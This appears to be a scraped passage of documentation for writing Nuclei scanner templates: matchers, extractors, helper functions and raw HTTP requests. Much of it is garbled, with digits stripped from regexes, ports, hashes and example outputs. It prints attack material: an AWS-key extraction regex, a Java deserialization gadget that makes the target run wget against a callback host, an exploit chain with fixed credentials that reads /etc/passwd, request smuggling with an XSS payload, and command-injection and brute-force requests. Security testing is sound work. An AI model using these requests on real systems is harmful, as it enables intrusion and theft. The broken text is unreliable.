...
Types
Multiple matchers can be specified in a request. There are basically types of matchers:
```
...
matchers:
  - type: binary
    binary:
      - \"B\" zip archive
      - \"A\" RAR archive version .      - \"FDAA\" xz tar.xz archive
    condition: or
    part: body
```
...
matchers:
  - type: dsl
    dsl:
      - \"len(body)<&& status_code==\" Body length less than and status code
      - \"contains(toupper(body), md(cookie))\" Check if the MDsum of cookies is contained in the uppercase body
```
Every part of a Protocol response can be matched with DSL matcher. Some examples:

Response Part	  Description	              Example :
content_length	Content-Length Header	    content_length >= status_code	    Response Status Code    	status_code==all_headers	    All all headers	          len(all_headers)
...
extractors:
  - type: regex type of the extractor
    ...
    regex:
      - \"(AT[A-Z-]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z-]{}\"  regex to use for extraction.
```
Kval Extractor
...
extractors:
  - type: xpath type of the extractor
    ...
    xpath:
      - \'/html/body/div/p[]/a\' xpath value for extraction
```
...
extractors:
  - type: regex  type of extractor
    ...
    match[] is the full match
    match[n] is the submatches. Most often we\'d want match[] as depicted below
    group:     regex:
      - \'<input\sname=\"csrf_token\"\stype=\"hidden\"\svalue=\"([[:alnum:]]{})\"\s/>\'
```
The above extractor with name csrf_token will hold the value extracted by ([[:alnum:]]{}) as abcdefgh.

If no group option is provided with this regex, the above extractor with name csrf_token will hold the full match (by <input name=\"csrf_token\"\stype=\"hidden\"\svalue=\"([[:alnum:]]{})\" />) as `<input name=\"csrf_token\" type=\"hidden\" value=\"abcdefgh\" />`
...
```
variables:
  a: \"test\" A string variable
  a: \"{{to_lower(rand_base())}}\" A DSL function variable
```
...
aes_gcm(key, plaintext interface) []byte	AES GCM encrypts a string with key	{{hex_encode(aes_gcm(\"AESKey-Characters\", \"exampleplaintext\"))}}	ecabeaebeedbacbeaaaecdeebccddeaeedcbase(src interface) string	Baseencodes a string	base(\"Hello\")	SGVsbG=
base_decode(src interface) []byte	Basedecodes a string	base_decode(\"SGVsbG=\")	Hello
base_py(src interface) string	Encodes string to baselike python (with new lines)	base_py(\"Hello\")	SGVsbG=

bin_to_dec(binaryNumber number | string) floatTransforms the input binary number into a decimal format	bin_to_dec(\"b\")<br>bin_to_dec()	compare_versions(versionToCheck string, constraints …string) bool	Compares the first version argument with the provided constraints	compare_versions(\'v..\', \'\>v..\', \'\<v..\')	true
concat(arguments …interface) string	Concatenates the given number of arguments to form a string	concat(\"Hello\", , \"world)	Helloworld
...
date_time(dateTimeFormat string, optionalUnixTime interface) string	Returns the formatted date time using simplified or go style layout for the current or the given unix time	date_time(\"%Y-%M-%D %H:%m\")<br>date_time(\"%Y-%M-%D %H:%m\", )<br>date_time(\"--:\", unix_time())	--:dec_to_hex(number number | string) string	Transforms the input number into hexadecimal format	dec_to_hex()\"	bends_with(str string, suffix …string) bool	Checks if the string ends with any of the provided substrings	ends_with(\"Hello\", \"lo\")	true
generate_java_gadget(gadget, cmd, encoding interface) string	Generates a Java Deserialization Gadget	generate_java_gadget(\"dns\", \"{{interactsh-url}}\", \"base\")	_jwt(json, algorithm, signature, unixMaxAge) []byte	Generates a JSON Web Token (JWT) using the claims provided in a JSON string, the signature, and the specified algorithm	generate_jwt(\"{\\"name\\":\\"John Doe\\",\\"foo\\":\\"bar\\"}\", \"HS\", \"hello-world\")	eyJhbGciOiJIUzINiIsInRcCIIkpXVCJ.eyJmbiOiJiYXIiLCJuYWlIjoiSmobiBEbUifQ.EsrLlIcYJR_Ns-JuhFVCllCPxwbpMCCfHin_WTU
gzip(input string) string	Compresses the input using GZip	base(gzip(\"Hello\"))	+HsIAAAAAAAA//JIzcnJBwQAAP//gonRwUAAAA=
gzip_decode(input string) string	Decompresses the input using GZip	gzip_decode(hex_decode(\"fbfffcdccffffdf\"))	Hello
hex_decode(input interface) []byte	Hex decodes the given input	hex_decode(\"\")	aa
hex_encode(input interface) string	Hex encodes the given input	hex_encode(\"aa\")	hex_to_dec(hexNumber number | string) floatTransforms the input hexadecimal number into decimal format	hex_to_dec(\"ff\")<br>hex_to_dec(\"xff\")	hmac(algorithm, data, secret) string	hmac function that accepts a hashing function type with data and secret	hmac(\"sha\", \"test\", \"scrt\")	bddccabcchtml_escape(input interface) string	HTML escapes the given input	html_escape(\"\<body\>test\</body\>\")	&lt;body&gt;test&lt;/body&gt;
html_unescape(input interface) string	HTML un-escapes the given input	html_unescape(\"&lt;body&gt;test&lt;/body&gt;\")	\<body\>test\</body\>
join(separator string, elements …interface) string	Joins the given elements using the specified separator	join(\"_\", , \"hello\", \"world\")	_hello_world
...
len(arg interface) int	Returns the length of the input	len(\"Hello\")	line_ends_with(str string, suffix …string) bool	Checks if any line of the string ends with any of the provided substrings	line_ends_with(\"Hello
Hi\", \"lo\")	true
...
Hello\", \"He\")	true
md(input interface) string	Calculates the MD(Message Digest) hash of the input	md(\"Hello\")	bacaabfcdmmh(input interface) string	Calculates the MMH(MurmurHash) hash of an input	mmh(\"Hello\")	oct_to_dec(octalNumber number | string) floatTransforms the input octal number into a decimal format	oct_to_dec(\"o\")<br>oct_to_dec()	print_debug(args …interface)	Prints the value of a given input or expression. Used for debugging.	print_debug(+, \"Hello\")	Hello
rand_base(length uint, optionalCharSet string) string	Generates a random sequence of given length string from an optional charset (defaults to letters and numbers)	rand_base(, \"abc\")	caccb
...
rand_int(optionalMin, optionalMax uint) int	Generates a random integer between the given optional limits (defaults to - MaxInt)	rand_int(, )	rand_text_alpha(length uint, optionalBadChars string) string	Generates a random string of letters, of given length, excluding the optional cutset characters	rand_text_alpha(, \"abc\")	WKozhjJWlJ
rand_text_alphanumeric(length uint, optionalBadChars string) string	Generates a random alphanumeric string, of given length without the optional cutset characters	rand_text_alphanumeric(, \"ab\")	NthIIiYr
rand_ip(cidr …string) string	Generates a random IP address	rand_ip(\".../\")	...rand_text_numeric(length uint, optionalBadNumbers string) string	Generates a random numeric string of given length without the optional set of undesired numbers	rand_text_numeric(, )	regex(pattern, input string) bool	Tests the given regular expression against the input string	regex(\"H([a-z]+)o\", \"Hello\")	true
remove_bad_chars(input, cutset interface) string	Removes the desired characters from the input	remove_bad_chars(\"abcd\", \"bc\")	ad
repeat(str string, count uint) string	Repeats the input string the given amount of times	repeat(\"../\", )	../../../../../
replace(str, old, new string) string	Replaces a given substring in the given input	replace(\"Hello\", \"He\", \"Ha\")	Hallo
replace_regex(source, regex, replacement string) string	Replaces substrings matching the given regular expression in the input	replace_regex(\"Hello\", \"(\\d+)\", \"\")	Hello
reverse(input string) string	Reverses the given input	reverse(\"abc\")	cba
sha(input interface) string	Calculates the SHA(Secure Hash ) hash of the input	sha(\"Hello\")	fffebbbebadeccddabfsha(input interface) string	Calculates the SHA(Secure Hash ) hash of the input	sha(\"Hello\")	fdbfefafcbeecedadstarts_with(str string, prefix …string) bool	Checks if the string starts with any of the provided substrings	starts_with(\"Hello\", \"He\")	true
to_lower(input string) string	Transforms the input into lowercase characters	to_lower(\"HELLO\")	hello
to_unix_time(input string, layout string) int	Parses a string date time using default or user given layouts, then returns its Unix timestamp	to_unix_time(\"--T::+:\")<br>to_unix_time(\"--::\")<br>to_unix_time(\"--::\". \"--::\")	to_upper(input string) string	Transforms the input into uppercase characters	to_upper(\"hello\")	HELLO
...
unix_time(optionalSeconds uint) floatReturns the current Unix time (number of seconds elapsed since January , UTC) with the added optional seconds	unix_time()	url_decode(input string) string	URL decodes the input string	url_decode(\"https:%F%Fprojectdiscovery.io%Ftest=\")	https://projectdiscovery.io?test=url_encode(input string) string	URL encodes the input string	url_encode(\"https://projectdiscovery.io/test?a=\")	https%A%F%Fprojectdiscovery.io%Ftest%Fa%Dwait_for(seconds uint)	Pauses the execution for the given amount of seconds	wait_for()	true
zlib(input string) string	Compresses the input using Zlib	base(zlib(\"Hello\"))	eJzySMJyQcEAAD//wWMAfU=
zlib_decode(input string) string	Decompresses the input using Zlib	zlib_decode(hex_decode(\"cfcdccffffcf\"))	Hello
resolve(host string, format string) string	Resolves a host using a dns type that you define	resolve(\"localhost\",)	...ip_format(ip string, format string) string	It takes an input ip and converts it to another format according to this legend, the second parameter indicates the conversion index and must be between and ip_format(\"...\", )	...
...
```
dns (URLDNS)
commons-collections.commons-collections.jdkujdkugroovy```
Supported encodings:
```
base(default)
gzip-basegzip
...
```
{{generate_java_gadget(\"commons-collections.\", \"wget http://{{interactsh-url}}\", \"base\")}}
```
...
{{randstr}}
```
Generates a random ID for a template on each nuclei run. This can be used anywhere in the template and will always contain the same value. randstr can be suffixed by a number, and new random ids will be created for those names too. Ex. {{randstr_}} which will remain same across the template.
...
```
  - raw:
      - |
        GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/.        Host: {{Hostname}}
```
...
Redirection conditions can be specified per each template. By default, redirects are not followed. However, if desired, they can be enabled with redirects: true in request details. redirects are followed at maximum by default which should be good enough for most use cases. More fine grained control can be exercised over number of redirects followed by using max-redirects field.
...
An example is provided below - https://example.com:/foo/bar.php
```
Variable	Value
{{BaseURL}}	https://example.com:/foo/bar.php
{{RootURL}}	https://example.com:{{Hostname}}	example.com:{{Host}}	example.com
{{Port}}	{{Path}}	/foo
{{File}}	bar.php
{{Scheme}}	https
```
...
For example, the attribute status_code will point to the effective status code of the current request/response pair in elaboration. Previous responses status codes are accessible by suffixing the attribute name with _n, where n is the n-th ordered request -based. So if the template has four requests and we are currently at number :

status_code: will refer to the response code of request number status_code_and status_code_will refer to the response codes of the sequential responses number one and two
For example with status_code_, status_code_, andbody_:

```
    matchers:
      - type: dsl
        dsl:
          - \"status_code_== && status_code_== && contains((body_), \'secret_string\')\"
```
...
```
    - raw:
      - |
        GET /manager/html HTTP/.        Host: {{Hostname}}
        Authorization: Basic {{base(\'username:password\')}}
```
...
http:
  - raw:
      - |
        POST /?file={{path}} HTTP/.        User-Agent: {{header}}
        Host: {{Hostname}}
...
http:
  ...
  - raw:
      - |
        POST /?username=§username§&paramb=§password§ HTTP/.        User-Agent: Mozilla/.(Macintosh; Intel Mac OS X __)
        Host: {{Hostname}}
        another_header: {{base(\'§password§\')}}
        Accept: /        body=test
...
http:
  ...
  - raw:
      - |
        POST /?param_a=§param_a§&paramb=§param_b§ HTTP/.        User-Agent: §param_a§
        Host: {{Hostname}}
        another_header: {{base(\'§param_b§\')}}
        Accept: /
        admin=test

      - |
        DELETE / HTTP/.        User-Agent: nuclei
        Host: {{Hostname}}

        {{sha(\'§param_a§\')}}

      - |
        PUT / HTTP/.        Host: {{Hostname}}
...
http:
  - raw:
      ...
      - |
        POST /testing HTTP/.        Host: {{Hostname}}
        Origin: {{BaseURL}}
...
info:
  ...
  author: princechaddha
  severity: high
  reference: https://github.com/jasn/CVE--
http:
  - raw:
      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponserequestbody&username=nsroot&set=HTTP/.        Host: {{Hostname}}
        User-Agent: Mozilla/.(X; Linux x_; rv:.) Gecko/Firefox/.        Content-Type: application/xml
        X-NITRO-USER: xpyZxwy        X-NITRO-PASS: xWXHUJ
        <appfwprofile><login></login></appfwprofile>

      - |
        GET /menu/ss?sid=nsroot&username=nsroot&force_setup=HTTP/.        Host: {{Hostname}}
        User-Agent: python-requests/..        Accept: /        Connection: close

      - |
        GET /menu/neo HTTP/.        Host: {{Hostname}}
        User-Agent: python-requests/..        Accept: /        Connection: close

      - |
        GET /menu/stc HTTP/.        Host: {{Hostname}}
        User-Agent: python-requests/..        Accept: /        Connection: close
      ...
      - |
        ...
        X-NITRO-USER: oYDXzQ
        X-NITRO-PASS: ZuUYc        rand_key: §randkey§

        <appfwprofile><login></login></appfwprofile>

      - |
        POST /rapi/filedownload?filter=path:%Fetc%Fpasswd HTTP/.        Host: {{Hostname}}
        User-Agent: python-requests/..        Accept: /        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oYDXzQ
        X-NITRO-PASS: ZuUYc        rand_key: §randkey§
...
http:
  - raw:
    - |+
        POST / HTTP/.        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length:         Transfer-Encoding: chunked

        
        GET /post?postId=HTTP/.        User-Agent: a\"/><script>alert()</script>
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 
        x=    - |+
        GET /post?postId=HTTP/.        Host: {{Hostname}}

    unsafe: true Enables rawhttp client
    matchers:
      - type: dsl
        dsl:
          - \'contains(body, \"<script>alert()</script>\")\'
```
...
```
    unsafe: true
    pipeline: true
    pipeline-concurrent-connections:     pipeline-requests-per-connection: ```
...
http:
  ...
  - raw:
      - |
        GET /protected HTTP/.        Host: {{Hostname}}
        Authorization: Basic {{base(\'admin:§password§\')}}
...
```
- |
  @Host: https://projectdiscovery.io:  POST / HTTP/.  Pragma: no-cache
  Host: {{Hostname}}
  Cache-Control: no-cache, no-transform
  User-Agent: Mozilla/.(Windows NT .; Win; x; rv:.) Gecko/Firefox/.```
...
http:
  - raw:
      ...
      - |
        GET /getkey HTTP/.        Host: {{Hostname}}

      This request will be sent instead to https://api.target.com:to verify the token validity
      - |
        @Host: https://api.target.com:        GET /api/key={{token}} HTTP/.        Host: api.target.com:
    extractors:
      - type: regex
        name: token
        part: body
...
- |
  @timeout: s
  POST /conf_mail.php HTTP/.  Host: {{Hostname}}
  Content-Type: application/x-www-form-urlencoded

  mail_address=%B{{cmd}}%B&button=%%%%B%%B%%%M
```
...
```
inputs:
  - read-size: Example with reading a number of bytes, and only matching on them.


inputs:
  - read-size:     name: prefix
...
matchers:
  - type: word
    part: prefix
...
Port
Starting from Nuclei v.., a new field called port has been introduced in network templates. This field allows users to specify the port separately instead of including it in the host field.
...
host:
  ...
  - \"{{Host}}:\"
```
In the above example, two network requests are sent: one to the port specified in the input/target, and another to the default SSH port ().

The reason behind introducing the port field is to provide users with more flexibility when running network templates on both default and non-default ports. For example, if a user knows that the SSH service is running on a non-default port of (after performing a port scan with service discovery), they can simply run:


$ nuclei -u scanme.sh:-id xyz-ssh-exploit
In this case, Nuclei will use port instead of the default port . If the user doesn’t specify any port in the input, port will be used by default. However, this approach may not be straightforward to understand and can generate warnings in logs since one request is expected to fail.

Another issue with the previous design of writing network templates is that requests can be sent to unexpected ports. For example, if a web service is running on port and the user runs:


$ nuclei -u scanme.sh:In this case, xyz-ssh-exploit template will send one request to scanme.sh:and another request to scanme.sh:, which may return unexpected responses and eventually result in errors. This is particularly problematic in automation scenarios.
...
host:
  - \"{{Hostname}}\"
port: ```
In this new design, the functionality to run templates on non-standard ports will still exist, except for the default reserved ports (, , , , , ). Additionally, the list of default reserved ports can be customized by adding a new field called exclude-ports:

```
exclude-ports: ,```
When exclude-ports is used, the default reserved ports list will be overwritten. This means that if you want to run a network template on port , you will have to explicitly specify it in the port field.
...
tcp:
  - inputs:
      - data: \"{{hex_decode(\'aaddeedffffffffd\')}}\"
    host:
      - \"{{Hostname}}\"
    port:     read-size:     matchers:
      - type: word
        words:
...
Use ECMAScript .JavaScript features to build and modify variables at runtime
...
```
In this code, we’ve introduced extra lines of JavaScript. This allows the template to perform vhost enumeration. The best part? You can run this at scale with all features of Nuclei, using supported inputs like ASN, CIDR, URL.
...
Note: In above example we used set(\"vhost\", vhost) which added vhost to template context (global variables) and then called http() which used this value in request.
...
Similar to DSL helper functions . we can either use built in functions available with Javascript (ECMAScript .) or use DSL helper functions and its upto user to decide which one to uses.
...
- Try adding at least matchers in a template it can be a response header or status code for the web templates.
...
- trailing spaces
- wrong indentation errosr like: expected but found - no new line character at the end of file
